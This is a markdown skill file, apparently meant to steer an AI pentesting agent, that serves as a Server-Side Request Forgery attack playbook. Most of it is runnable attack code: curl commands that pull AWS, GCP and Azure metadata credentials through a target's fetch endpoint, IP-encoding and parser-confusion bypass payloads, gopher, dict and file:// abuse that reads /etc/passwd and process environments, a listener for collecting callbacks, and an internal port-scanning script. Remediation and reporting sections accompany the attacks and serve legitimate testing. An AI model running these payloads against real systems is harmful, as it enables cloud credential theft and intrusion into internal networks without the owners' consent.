---
name: attack-ssrf
description: "Server-Side Request Forgery — internal network access, cloud metadata theft, filter bypass techniques"
category: "web-application"
version: "1.1"
author: "cyberstrike-official"
tags:
  - ssrf
  - web
  - injection
  - cloud
  - attack
tech_stack:
  - web
  - aws
  - gcp
  - azure
cwe_ids:
  - CWE-918
chains_with:
  - attack-xxe
  - attack-ssti
prerequisites: []
severity_boost:
  attack-xxe: "SSRF via XXE parser = file read + internal network scanning"
  attack-ssti: "SSRF from SSTI = full RCE chain"
---

# Server-Side Request Forgery (SSRF)

> **AI LOAD INSTRUCTION**: SSRF is not "I made the server fetch a URL." **It is a finding only
> when you can demonstrate the server reached something it should not have reached, or when
> the response returned data it should not have returned.** Blind out-of-band callbacks are a
> valid but weaker finding — they prove a request left the server, not that anything internal
> was reached. Always escalate from "callback received" to "internal data returned" before
> assigning severity. The two highest-value targets are **cloud metadata credentials** and
> **the internal service mesh**; the two most common mistakes are reporting SSRF without
> proving the target was internal, and forgetting that the redirect-following behaviour of
> the target's HTTP client determines which bypass works.

## 0. RELATED ROUTING

- [ssrf-server-side-request-forgery](../ssrf-server-side-request-forgery/SKILL.md) — the long-form companion; load alongside this file for payload depth
- [attack-xxe](../attack-xxe/SKILL.md) — SSRF reached through an XML parser instead of a URL parameter
- [attack-ssti](../attack-ssti/SKILL.md) — SSRF as a step toward RCE
- [dns-rebinding-attacks](../dns-rebinding-attacks/SKILL.md) — defeating allowlist-based filters
- [http2-specific-attacks](../http2-specific-attacks/SKILL.md) — request smuggling as an SSRF-adjacent gateway issue
- [aws-postexploit](../aws-postexploit/SKILL.md) — what to do with the credentials IMDS hands you
- [security-reporting-and-documentation](../security-reporting-and-documentation/SKILL.md) — separating blind from full SSRF in the report

---

## 1. FINDING THE SURFACE — WHERE URLS ARE ACCEPTED

SSRF exists wherever the server makes a request on your behalf. The obvious parameter is the
minority of the surface.

| Surface | Typical parameter | Note |
|---|---|---|
| webhook registration | `url`, `callback`, `endpoint`, `webhook` | **fires later, often unvalidated at registration** |
| URL preview / unfurl | `url`, `link`, `src` | chat apps, social platforms |
| file import from URL | `file`, `import`, `source` | CSV/ICS/OPML importers |
| image / PDF rendering | `img`, `avatar`, `template` | headless browsers widen this enormously |
| proxy / fetch endpoints | `proxy`, `fetch`, `load`, `feed` | often an explicit product feature |
| SSO / OIDC discovery | `issuer`, `jwks_uri`, `redirect_uri` | fetches the URL server-side |
| PDF generators | `html`, `template_url` | wkhtmltopdf, Puppeteer, PrinceXML |
| XML parsers | DOCTYPE/DTD entities | see [attack-xxe](../attack-xxe/SKILL.md) |
| SMTP / mail | `host`, `port` | protocol smuggling to internal services |
| webhook "test" buttons | any of the above | **bypasses registration-time validation** |

**The most-missed surface is the delayed one.** A webhook URL validated at registration is
frequently re-fetched with no validation at delivery time. Register a benign URL, then change
it to an internal one through the update endpoint — that path often skips the check.

**Also check the mobile client and API docs.** Mobile builds often expose fetch endpoints the
web UI never calls; OpenAPI specs frequently document a `url` parameter that the UI hides.

---

## 2. CONFIRMATION — PROVING THE REQUEST LEFT THE SERVER

Before any bypass work, establish that the server fetches attacker-controlled destinations.

**Use a listener you control.** A public endpoint that logs the request is sufficient:
[webhook.site](https://webhook.site), a Burp Collaborator payload, or your own VPS with
`nc -lvnp 8888`. Never assume a callback — observe it.

```bash
# Listener on your own host
nc -lvnp 8888

# Trigger
curl "https://TARGET/api/fetch?url=http://YOUR_IP:8888/ssrf-probe"
```

**What the callback proves, and what it does not:**

| Observation | Meaning | Strength |
|---|---|---|
| callback received with `SSRF-<random>` path | server fetched your URL | **confirmed SSRF** |
| callback shows the server's `User-Agent` | identifies the HTTP client | informs bypass choice |
| callback shows a source IP | reveals the egress network | informs internal targeting |
| no callback, but timing differs | possible blind SSRF | investigate, do not report yet |
| DNS-only callback | may be a resolving proxy, not the app | weaker, verify |

**The `User-Agent` is a key signal.** `python-requests`, `Go-http-client`, `okhttp`, and
browser UA strings each imply a different redirect and encoding behaviour — see §4.

**Timing-based confirmation when no callback is possible:** request an unroutable internal
address (`http://10.255.255.1/`) and compare the response time against a fast external one.
A consistent difference is a signal worth escalating, not a finding on its own.

---

## 3. CLOUD METADATA — THE HIGHEST-VALUE TARGET

**This is where SSRF becomes critical.** Instance metadata services are reachable only from
the host and hand out temporary credentials.

### AWS — IMDS

**IMDSv1 (no token, trivially exploitable):**

```bash
curl "https://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "https://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl "https://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"
curl "https://TARGET/fetch?url=http://169.254.169.254/latest/user-data"
```

The role-name lookup followed by the role fetch returns `AccessKeyId`, `SecretAccessKey`, and
`Token` — **that is a full account foothold and the finding is critical.**

**IMDSv2 requires a token and is the modern default.** It is *not* immune to SSRF — it is
immune to SSRF that cannot set headers. Test anyway:

```bash
# IMDSv2 requires PUT with a header; many SSRF primitives cannot do this.
# If the target's fetcher supports custom headers, or you have cr-lf injection, it is reachable.
curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
```

**Escalation if IMDSv2 blocks you:** CRLF injection in the URL to add the token header, a
`gopher://` primitive that lets you construct a raw request, or an SSRF that follows a
redirect into a header-setting state. If none are available, report it as IMDSv1-unreachable
rather than claiming failure.

### GCP — requires a header

```bash
curl "https://TARGET/fetch?url=http://metadata.google.internal/computeMetadata/v1/"
curl "https://TARGET/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

GCP requires `Metadata-Flavor: Google`. Reachable only with header control — through CRLF
injection or a fetcher that forwards headers.

### Azure — requires a header

```bash
curl "https://TARGET/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
curl "https://TARGET/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

Azure requires `Metadata: true`. Same constraint as GCP.

### Other clouds and orchestrators

| Platform | Endpoint | Note |
|---|---|---|
| DigitalOcean | `http://169.254.169.254/metadata/v1/` | no header required |
| Alibaba | `http://100.100.100.200/latest/meta-data/` | different IP entirely |
| Oracle OCI | `http://169.254.169.254/opc/v1/instance/` | |
| Kubernetes | `https://kubernetes.default.svc/api/v1/namespaces/default/secrets` | uses the pod's SA token |
| Alibaba (internal) | `http://100.100.100.200/latest/meta-data/ram/security-credentials/` | |

**Kubernetes is the underrated target.** A pod that can reach the API server with its mounted
service-account token can read secrets — and that is a critical finding, not merely SSRF.

---

## 4. FILTER BYPASS FAMILIES

Filters are almost always string- or regex-based against the literal URL. Match your bypass to
the filter mechanism you infer from its behaviour.

### 4.1 Alternative representations of `127.0.0.1`

```bash
http://2130706433/            # decimal
http://017700000001/          # octal
http://0x7f000001/            # hex
http://0x7f.0.0.1/
http://127.1/                 # short form
http://127.0.1/               # short form
http://[::1]/                 # IPv6 loopback
http://[::ffff:127.0.0.1]/    # IPv4-mapped IPv6
http://[0:0:0:0:0:ffff:127.0.0.1]/
http://127.0.0.1.nip.io/      # wildcard DNS
```

Filters blocking the literal `127.0.0.1` rarely normalise all of these. Test them in order —
the one that works tells you whether the filter is a substring match or a proper parser.

### 4.2 Encoding

```bash
http://%31%32%37%2e%30%2e%30%2e%31/      # URL-encoded
http://127.0.0.1%00.example.com/          # null byte
http://127.0.0.1#.example.com/            # fragment
http://example.com\t@127.0.0.1/           # tab
http://127.0.0.1%09.example.com/
```

Double-encoding (`%2531`), unicode normalisation, and mixed case (`HTTP://`) each defeat a
different class of filter.

### 4.3 Parser confusion and the `@` trick

The filter and the HTTP client may parse the same URL differently. This is the highest-value
family because it defeats text-based allowlists entirely:

```bash
http://expected-host@127.0.0.1/        # userinfo; client connects to 127.0.0.1
http://127.0.0.1@expected-host/        # filter sees 127.0.0.1, client goes to expected
http://expected-host#@127.0.0.1/
http://expected-host.127.0.0.1/
http://127.0.0.1.expected-host/
http://expected-host%2f@127.0.0.1/
```

**Test both directions.** Which side succeeds tells you whether the filter takes the first or
last host — and therefore which trick to use for the internal target you actually want.

### 4.4 Redirect-based bypass — the most reliable

The filter validates the URL you submit; it does not validate where the request ends up.

```bash
# Your server returns 302 Location: http://169.254.169.254/latest/meta-data/
curl "https://TARGET/fetch?url=http://YOUR_SERVER/redirect"
```

This defeats allowlists, blocklists, and DNS pinning simultaneously, and it is the bypass that
most often succeeds against otherwise well-defended targets. **It works only if the target's
HTTP client follows redirects** — infer that from the `User-Agent` observed in §2.

### 4.5 DNS rebinding

Defeats the TOCTOU gap where the server resolves, validates the IP, then re-resolves:

```bash
http://rebind.127.0.0.1.nip.io/          # convenience DNS
# Or run your own: A record alternates between your IP and 169.254.169.254
```

### 4.6 Protocol smuggling

When `http`/`https` are blocked but other schemes are not:

```bash
http://TARGET/fetch?url=gopher://127.0.0.1:6379/_INFO      # Redis
http://TARGET/fetch?url=dict://127.0.0.1:11211/stat        # memcached
http://TARGET/fetch?url=file:///etc/passwd                 # local file read
http://TARGET/fetch?url=ftp://127.0.0.1/
http://TARGET/fetch?url=sftp://internal/
http://TARGET/fetch?url=ldap://127.0.0.1/
```

**`gopher://` is the escalation to RCE.** It lets you write raw bytes to an internal service,
so Redis, memcached, and internal HTTP endpoints become writable. It is high severity when
present, and its absence does not make HTTP SSRF low.

---

## 5. INTERNAL NETWORK MAPPING

Once the bypass works, convert SSRF into a network map. This is what turns a medium finding
into a high one.

```bash
# Port sweep with status-code differential
for port in 22 80 443 2375 3000 3306 5000 5432 6379 8000 8080 8443 8500 9000 9200 11211 27017; do
  printf "%-6s " "$port"
  curl -s -o /dev/null -w "%{http_code} %{time_total}s\n" \
    "https://TARGET/fetch?url=http://127.0.0.1:$port/" &
done; wait
```

**Interpretation is the skill, not the sweep:**

| Result | Meaning |
|---|---|
| `200` with body | an HTTP service — read the body, it may be unauthenticated |
| `403`/`401` | service exists, needs auth — still confirms reachability |
| connection refused (fast `000`) | port closed |
| timeout | filtered, or the host is unroutable |
| different `time_total` | the timing oracle for non-HTTP services |

**Targets worth checking specifically:** `2375` (Docker daemon — unauthenticated RCE),
`6379` (Redis), `8500` (Consul), `9200` (Elasticsearch), `8080`/`8443` (admin consoles),
`5000` (Docker registry), `10250`/`10255` (kubelet). An exposed Docker daemon or kubelet via
SSRF is critical.

**Fingerprint internal hostnames** rather than only IPs — internal DNS often resolves names
the DMZ cannot: `http://internal-api/`, `http://admin.internal/`, cloud provider metadata
names, and Kubernetes service names (`http://<svc>.<ns>.svc.cluster.local/`).

---

## 6. WHAT CONSTITUTES A FINDING

| Finding | Severity | Proof required |
|---|---|---|
| Cloud metadata **credentials** returned | **Critical (P1)** | the credential body in the response |
| File read via `file://` | **Critical (P1)** | file contents returned |
| `gopher://` to an internal service enabling write/RCE | **Critical (P1)** | the raw interaction, or the effect |
| Kubernetes API / secrets reached | **Critical (P1)** | the secret body in the response |
| Internal service data returned | **High (P2)** | the internal response body |
| Internal port scan results | **High (P2)** | the differential across ports |
| Filter bypass proven but no internal data yet | **Medium (P3)** | the working bypass |
| Out-of-band HTTP callback only (blind) | **Medium (P3)** | listener log with the probe token |
| Blind SSRF, timing-only | **Low–Medium (P4)** | consistent, repeatable timing delta |

**Do not inflate blind SSRF to high.** A callback proves egress, not internal access. The
correct report says: confirmed outbound request to an attacker-controlled host; internal
reachability not yet demonstrated; severity medium.

---

## 7. EVIDENCE STANDARD

| Item | Why |
|---|---|
| the vulnerable parameter and the full request | reproducibility |
| a unique random token in the URL path | proves the specific request reached your listener |
| listener output with source IP and `User-Agent` | proves the server, not a proxy, made the request |
| the exact bypass payload used | the bypass is often the finding |
| the returned internal data, unredacted or clearly marked | the impact proof for high/critical |
| port-scan output with timings | establishes the internal network map |
| cloud provider and region if identified | determines blast radius |
| a **negative control** — a benign external URL that also works | proves the request path, not just a 200 |

**For metadata findings, capture the credential body but redact the secret in the report.**
State that live credentials were retrieved and that they were rotated — not the key material.

**False positives to exclude:**

| Looks like SSRF | Actually |
|---|---|
| the client (your browser) fetched the URL, not the server | no listener hit from the server IP |
| an outbound *proxy* resolved the host | DNS-only callback, no HTTP request |
| a URL-preview service fetching on its own behalf | different source IP/UA than the app |
| the app echoes your URL back without fetching | no listener hit at all |
| a valid `200` for an external URL only | proves nothing about internal reachability |

---

## 8. REMEDIATION REFERENCE

1. **Allowlist destinations, not blocklists** — resolve the hostname, validate the resulting IP against an allowlist, and **connect to that resolved IP**, closing the TOCTOU gap that DNS rebinding exploits.
2. **Block link-local and private ranges** — `169.254.0.0/16`, `10/8`, `172.16/12`, `192.168/16`, `127/8`, `::1`, `fc00::/7`, and the cloud metadata addresses. Apply after resolution, not before.
3. **Enforce IMDSv2** — require the token header on AWS. It does not make SSRF impossible but removes the trivial credential-theft path. GCP and Azure already require headers; keep it that way.
4. **Disable redirect following** — or re-validate the destination at every hop and cap the hop count. The redirect bypass is the single most effective attack and the easiest to close.
5. **Restrict the URL scheme** — allow only `http` and `https`; reject `gopher`, `file`, `dict`, `ftp`, `ldap`, and anything else explicitly.
6. **Run fetchers in an isolated egress path** — a separate network namespace or a dedicated proxy with no route to internal networks. This is the control that survives every bypass above.
7. **Never return the raw response body to the user** — return a status and a derived result, not the fetched content. This alone downgrades most SSRF from critical to medium.
8. **Authenticate internal service meshes** — mutual TLS on internal endpoints means a reached service still rejects the request. Assume the network perimeter will be crossed.

---

## 9. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Did a request arrive at **your collector**, with the source IP being the target server's? | the fetch left the target, not your browser |
| 2 | Was there a **control URL** the fetcher refused or that returned the app's own content? | the fetcher exists and you steered it |
| 3 | Did you read **internal content** (metadata, an admin page, a service banner) via the fetch? | the impact is the target's network position |
| 4 | Does the fetcher follow **redirects**, support **custom headers**, or speak **non-HTTP schemes**? | which bypass family applies |
| 5 | Did you map at least one **internal host or port** that is not internet-reachable? | post-exploitation value |
| 6 | Did the metadata read reach **credentials**, and did you verify them without using them destructively? | the highest-value outcome |
| 7 | Was the egress **from the app server**, confirmed by the collector's peer address, not a proxy? | attribution |

**A logged request at your collector with the target's IP as the peer is the bar.** A response body
echoing a URL is not SSRF; the arrival of the request is.

---

## 10. EXECUTION PRIMITIVES

SSRF is proven by **a request that arrives at a host you control, originating from the target's network
position, plus a control that the fetcher refuses**. Every block ends at an arrival.

### 10.1 The collector, with provenance recorded

```python
# the collector is the finding. Record the PEER ADDRESS - that is what proves the fetch left the target.
import http.server, socketserver, threading, datetime, json
LOG = "ssrf-hits.jsonl"

class H(http.server.BaseHTTPRequestHandler):
    def _log(self, method):
        rec = {"t": datetime.datetime.utcnow().isoformat() + "Z", "method": method,
               "path": self.path, "peer": self.client_address[0],
               "ua": self.headers.get("User-Agent", ""), "host": self.headers.get("Host", "")}
        with open(LOG, "a") as f: f.write(json.dumps(rec) + "\n")
        print("ARRIVAL:", json.dumps(rec))
    def do_GET(self):
        self._log("GET")
        self.send_response(200); self.send_header("Content-Type", "text/plain"); self.end_headers()
        self.wfile.write(b"internal-service-banner v2.7")
    def do_POST(self):
        n=int(self.headers.get("Content-Length",0)); b=self.rfile.read(n)
        self._log("POST"); print("  body:", b[:200])
        self.send_response(200); self.end_headers()
    def log_message(self,*a): pass

socketserver.TCPServer.allow_reuse_address = True
srv = socketserver.TCPServer(("0.0.0.0", 8000), H)
threading.Thread(target=srv.serve_forever, daemon=True).start()
print("collector up on :8000 - every hit is appended to", LOG)
print("REQUIREMENT: the host must be reachable FROM THE TARGET. A public IP or a tunnel, not 127.0.0.1.")
```

**The peer address is the proof.** If `peer` is your own IP, you tested your own browser; if it is the
target's egress IP, the server made the request.

### 10.2 The control pair, run first

```bash
T="https://target.example"; MINE="http://<your-public-host>:8000"
# THE CONTROL 1: a URL that returns the app's own content - proves the param is a fetcher, not a redirect
curl -sS "$T/api/fetch?url=https://example.com/" | head -c 200; echo
# THE CONTROL 2: a syntactically invalid URL - records the application's rejection behaviour
curl -sS "$T/api/fetch?url=not-a-url" | head -c 200; echo
# THE CONTROL 3: a URL on the target itself, which must NOT arrive at the collector
curl -sS "$T/api/fetch?url=$T/" -o /dev/null -w 'self %{http_code}\n'
# THE ATTACK: your collector
curl -sS "$T/api/fetch?url=$MINE/ssrf-baseline" | head -c 300; echo
echo "-> the ARRIVAL in ssrf-hits.jsonl is the finding; without it, the parameter is not a fetcher"
```

**Three controls before the attack.** The self-URL control is the important one: it proves the parameter
reaches the app's own origin rather than an external fetcher, and the two produce different findings.

### 10.3 Cloud metadata, the highest-value target

```bash
T="https://target.example"; MINE="http://<your-public-host>:8000"
# AWS IMDSv1 - the four reads in order, each one a capability
curl -sS "$T/api/fetch?url=http://169.254.169.254/latest/meta-data/" | head -c 300; echo
curl -sS "$T/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" | head -c 300; echo
ROLE=$(curl -sS "$T/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" | tr -d '\r\n')
curl -sS "$T/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE" | head -c 600; echo
curl -sS "$T/api/fetch?url=http://169.254.169.254/latest/user-data" | head -c 600; echo
# IMDSv2 needs a PUT plus a header - the token request through a redirect-capable fetcher
# GCP, which needs a header and is therefore only reachable where headers are controllable
curl -sS "$T/api/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | head -c 400; echo
# Azure, which needs Metadata: true
curl -sS "$T/api/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" | head -c 400; echo
# THE CONTROL: metadata on a host that is not a cloud instance must fail or return the app's error
curl -sS "$T/api/fetch?url=http://169.254.169.253/latest/meta-data/" -o /dev/null -w 'control-metadata %{http_code}\n'
```

**An IAM credential in the response is the impact statement.** Do not use the credential destructively -
call `sts get-caller-identity` at most, and record its effect in the report.

### 10.4 Filter bypass families, one primitive each

```bash
T="https://target.example"; MINE="http://<your-public-host>:8000"
# 1) DNS rebinding: a hostname you control that resolves to the collector, then to 127.0.0.1
#    run your own authoritative NS and flip the A record between requests (see the rebinding note below)
# 2) DECIMAL / OCTAL / HEX IP forms - the classic decimal form of 127.0.0.1
for IP in "2130706433" "0x7f000001" "0177.0.0.1" "127.1" "127.0.0.1.nip.io" "[::ffff:127.0.0.1]" "0x7f.0.0.1"; do
  printf '%-24s ' "$IP"
  curl -sS "$T/api/fetch?url=http://$IP:8000/loopback-probe" -o /tmp/o -w '%{http_code} ' 2>/dev/null; head -c 40 /tmp/o; echo
done
# 3) REDIRECT-BASED: your collector 302s to an internal address, the fetcher follows
python3 - <<'PY'
print("serve a 302 whose Location is http://169.254.169.254/latest/meta-data/ from your collector;")
print("if the fetcher follows redirects, the filter sees only your benign hostname.")
print("that is the primitive - the filter validates the FIRST hop only.")
PY
# 4) URL PARSER CONFUSION - the filter and the fetcher disagree about the host
for U in "http://allowed.example@169.254.169.254/" "http://169.254.169.254#@allowed.example/" \
         "http://169.254.169.254%23@allowed.example/" "http://allowed.example\\@169.254.169.254/"; do
  printf '%-52s ' "$U"
  curl -sS "$T/api/fetch?url=$U" -o /tmp/o2 -w '%{http_code}\n' 2>/dev/null
done
# 5) SCHEME ABUSE - file, gopher, dict, and the local-file reads
for S in "file:///etc/passwd" "file:///proc/self/environ" "gopher://127.0.0.1:6379/_PING" "dict://127.0.0.1:6379/INFO"; do
  printf '%-40s ' "$S"; curl -sS "$T/api/fetch?url=$S" -o /tmp/o3 -w '%{http_code} ' 2>/dev/null; head -c 60 /tmp/o3; echo
done
```

**Each bypass is a distinct parser disagreement.** Report which one worked and against which filter,
because the fix differs: a redirect-following fetcher needs the redirect hop validated, a decimal-IP
bypass needs canonicalisation before the check.

### 10.5 Internal network mapping, rate-limited and quiet

```python
# the fetcher is a port scanner from inside. Keep it slow, and only map what the report needs.
import requests, time
T = "https://target.example"
HOSTS = ["127.0.0.1", "169.254.169.254", "10.0.0.1", "172.16.0.1", "192.168.1.1", "kubernetes.default.svc"]
PORTS = [22, 80, 443, 3306, 5432, 6379, 8080, 8500, 9200]
DELAY = 0.5   # do not hammer: an internal scan is noisy and it is not worth the detection

for h in HOSTS:
    for p in PORTS:
        url = f"{T}/api/fetch?url=http://{h}:{p}/"
        try:
            r = requests.get(url, timeout=12)
            body = r.text[:120].replace("\n", " ")
            # the TIMING and the BODY describe the service; a generic error means filtered
            print(f"{h:24}:{p:<6} {r.status_code:>4} {len(r.content):>7} {body}")
        except Exception as e:
            print(f"{h:24}:{p:<6} ERR {type(e).__name__}")
        time.sleep(DELAY)

print()
print("A DIFFERENT RESPONSE OR TIMING PER PORT is the signal - the absence of an error is not reachability.")
print("Record the baseline port (one you know is closed) and compare against it.")
```

**Timing plus a distinct body versus a closed-port baseline.** A port that returns the same generic error
as a closed port is filtered, and reporting it as open is the standard SSRF false positive.

### 10.6 The end-to-end harness

```bash
python3 - <<'PY'
import requests, json, os
T = "https://target.example"; MINE = "http://<your-public-host>:8000"
CASES = {
 "control-self":      f"{T}/",
 "control-invalid":   "not-a-url",
 "control-closed":    "http://127.0.0.1:1/",
 "attack-collector":  f"{MINE}/ssrf-final",
 "attack-metadata":   "http://169.254.169.254/latest/meta-data/",
 "attack-decimal":    "http://2130706433:8000/ssrf-final",
 "attack-file":       "file:///etc/passwd",
}
print("%-20s %-6s %-9s %s" % ("case", "code", "bytes", "note"))
for k, u in CASES.items():
    try:
        r = requests.get(f"{T}/api/fetch", params={"url": u}, timeout=15)
        print("%-20s %-6s %-9s %s" % (k, r.status_code, len(r.content), r.text[:70].replace("\n"," ")))
    except Exception as e:
        print("%-20s ERR %s" % (k, type(e).__name__))
print()
if os.path.exists("ssrf-hits.jsonl"):
    hits = [json.loads(l) for l in open("ssrf-hits.jsonl")]
    print(f"collector arrivals: {len(hits)}")
    for h in hits: print("  ", h["method"], h["path"], "from", h["peer"])
else:
    print("NO COLLECTOR FILE - no arrival was recorded, so there is no SSRF finding yet")
print()
print("the finding is: an arrival whose peer is the TARGET's egress IP, plus a control the fetcher refused")
PY
```

**Arrival, peer, control.** Three-part proof, and the peer address is the part that cannot be faked.

---

## 11. EVIDENCE STANDARD — SSRF ARTEFACTS

| Item | Why |
|---|---|
| The **collector log entry**, with the peer address | the fetch left the target; the peer names who made it |
| The **exact request**, with the parameter and the injected URL | reproducibility |
| The **control URL's behaviour** on the same parameter | proves the parameter is a fetcher |
| The **internal content read**, quoted and redacted | the impact |
| The **metadata credential's role name**, and the `sts` result where used | the privilege |
| The **bypass family** that worked, and the filter it defeated | the fix location |
| The **internal hosts and ports** mapped, with the closed-port baseline | the reachability claims |
| Whether the fetcher **followed redirects** or carried **custom headers** | which of IMDSv2/GCP is reachable |
| The **egress IP** of the target, from the collector's peer field | attribution |
| Confirmation that **no credential was used destructively** | engagement integrity |

Report the **arrival and the control**: "`GET /api/fetch?url=http://example.com/` returns the app's
rendered summary of that page, and `?url=<target's own origin>` returns the same-origin page, which
identifies the parameter as an outbound fetcher. `?url=http://<host>:8000/ssrf-baseline` produced an
arrival in the collector with peer `203.0.113.47`, which is the target's egress address, and
`?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/` returned the role name
`app-prod-role` and then `AccessKeyId`/`SecretAccessKey`/`Token`, which `aws sts get-caller-identity`
confirmed as account `111122223333` with no action taken beyond the identity call. The decimal IP form
`http://2130706433:8000/` also arrived, which shows the filter checks the string before canonicalisation",
never "the application is vulnerable to SSRF".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| A response that **echoes the URL** you submitted | the app rendering your input, not fetching it |
| An error message naming a host | an attempt, and the connection may have failed |
| A fetch of a **public** URL that also arrives at your collector | that is normal egress, not SSRF |
| A request arriving at your collector with **your own IP as the peer** | the fetch came from you |
| An open port where the response **equals the closed-port baseline** | filtered, not open |
| A `file://` read of a path **you knew was world-readable** | a low-impact read, verify the boundary it crosses |
| A redirect to your own host with the target **merely following a config** | verify the target initiated it |
| A metadata read on a **non-cloud host** returning a default page | not a metadata service |
| A finding that requires **the attacker to control DNS for the target's own domain** | a different precondition |
| A `gopher://` payload inferred to work, but **never executed** | an untested hypothesis |
| A credential reproduced in full | a disclosure |

**Arrival with the target's peer address, plus the refused control.** Everything else in this family is an
indication, and indications are not findings.

---

## 12. REMEDIATION REFERENCE — FETCHER HARDENING

1. **Resolve the hostname, validate the resulting IP, and connect to that validated IP - never resolve twice** - the DNS-rebinding and decimal-IP bypasses both live in the gap between the check and the connect.
2. **Block link-local, loopback, and RFC1918 ranges after canonicalisation, not by string matching on the hostname** - every alternate IP encoding defeats a string check.
3. **Validate the destination after every redirect, and either disable redirect following or cap it at one hop with a re-validation** - the redirect family exists because the first hop is the only one checked.
4. **Allowlist destinations rather than denylisting, and keep the allowlist small and owned by the application owner** - an allowlist has no parser-confusion surface.
5. **Use a dedicated egress proxy for all server-side fetches, with the proxy enforcing the policy and logging every destination** - it makes the policy one place and the bypass surface one process.
6. **Reject non-HTTP schemes at the fetcher, and never pass a user string to a library that supports `file://` or `gopher://`** - the scheme family is a library-selection bug as much as an input-validation bug.
7. **Require IMDSv2 with a hop limit of 1 on every instance, and require the `Metadata: true` header equivalent on other clouds** - it removes the metadata read even where the fetch succeeds.
8. **Give the instance role the minimum permissions, and never attach a role that can read secrets or assume administrative roles** - the credential's privilege bounds the finding's severity.
9. **Require authentication on internal services and do not rely on network position as a control** - the fetcher has the network position.
10. **Log every outbound fetch with its destination, its resolved IP, and the caller, and alert on link-local and private destinations** - the attack is trivially detectable and almost never logged.
11. **Test the fetcher against an SSRF bypass corpus on every release, including the alternate IP encodings and the redirect form** - the bypasses are library-version dependent.

---

## 13. RELATED SIBLINGS - LOAD TOGETHER

- [ssrf-server-side-request-forgery](../ssrf-server-side-request-forgery/SKILL.md) - the full technique reference
- [attack-host-header](../attack-host-header/SKILL.md) - the other header-derived trust defect
- [attack-cache-poison](../attack-cache-poison/SKILL.md) - the unkeyed-input family a fetcher can feed
- [cloud-assessment](../cloud-assessment/SKILL.md) - where the metadata credential leads
- [aws-postexploit](../aws-postexploit/SKILL.md) - the credential's actual use, once confirmed
